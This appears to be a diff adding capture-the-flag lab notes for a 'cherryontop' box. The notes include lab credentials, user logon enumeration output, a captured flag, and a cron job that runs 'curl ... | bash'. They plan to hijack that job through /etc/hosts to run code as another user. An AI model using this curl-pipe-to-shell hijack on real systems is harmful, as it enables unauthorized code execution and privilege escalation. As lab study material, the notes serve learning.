@@ -1,0 +1,43 @@
+GIVEN CREDENTIALS::
+Username: notsus
+Password: dontbeascriptkiddie
+
+We can directly ssh it::
+
+###### $ cat youFoundIt.txt
+Hey good work hacker. Glad you made it this far!
+
+From here, we should be able to hit Bob-Boba where it hurts! Could you find a way to escalate your privileges vertically to access his account?
+
+Keep your's eyes peeled and don't be a script kiddie!
+
+- Jex
+#################
+
+╔══════════╣ Last time logon each user
+Username         Port     From             Latest                                                                                                                                                                                          
+root             pts/0    10.23.8.228      Mon May 26 16:43:47 +0000 2025
+chad-cherry      pts/0    10.0.2.16        Sat Apr  8 10:44:17 +0000 2023
+molly-milk       tty1                      Mon Jan 15 21:40:22 +0000 2024
+sam-sprinkles    pts/0    10.0.2.15        Fri Jan  5 23:31:43 +0000 2024
+bob-boba         pts/0    10.0.2.15        Fri Jan  5 23:30:58 +0000 2024
+notsus           pts/0    10.21.129.108    Fri Jun 20 06:33:08 +0000 2025
+######################
+
+ Do not forget to test 'su' as any other user with shell: without password and with their names as password (I don't do it in FAST mode...)                                                   
+╔══════════╣ Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!
+
+
+We also found 
+nano.cherryontop.thm
+##################### We will add it to the /etc/hosts
+
+#############
+Interesting cron job
+curl cherryontop.tld:8000/home/bob-boba/coinflip.sh | bash
+
+we can create the ::home/bob-boba/coinflip.sh  : in our local machine and map it to the cherryontop.tld and intercept the traffic passing through it.
+
+:::::::::::::::::::::::::::::::::::::::::::;
+cat chads-key3.txt
+7h3fu7ur3
